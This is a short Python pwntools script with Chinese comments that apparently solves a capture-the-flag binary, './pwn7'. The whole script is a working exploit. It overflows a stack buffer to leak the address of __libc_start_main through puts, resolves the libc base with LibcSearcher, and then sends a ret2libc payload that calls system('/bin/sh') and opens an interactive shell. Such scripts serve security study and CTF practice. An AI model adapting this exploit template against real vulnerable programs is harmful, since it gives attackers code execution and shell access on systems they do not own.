# coding=utf-8
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./pwn7')

pwn7 = ELF('./pwn7')

puts_plt = pwn7.plt['puts']
libc_start_main_got = pwn7.got['__libc_start_main'] #  载入的libc_main函数的地址。
main = pwn7.symbols['main']

success("leak libc_start_main addr and return to main again")
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got]) # 首先通过puts函数的执行，将libc_main的载入地址泄漏出来。
sh.sendlineafter('Can you find it !?', payload)

success("get the libc base, and get system@got")
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)   # 搜索系统中所载入的libc库，并且自动读取里面的所有导出函数的相对地址。
libcbase = libc_start_main_addr - libc.dump('__libc_start_main') # 载入的libc_main地址减去，libc_main在libc库中的偏移，就是libc的基地址。
system_addr = libcbase + libc.dump('system')   # 从而获得system的载入地址
binsh_addr = libcbase + libc.dump('str_bin_sh') # 从而获得 /bin/sh字符串的载入地址

payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr]) # 
sh.sendline(payload)

sh.interactive()
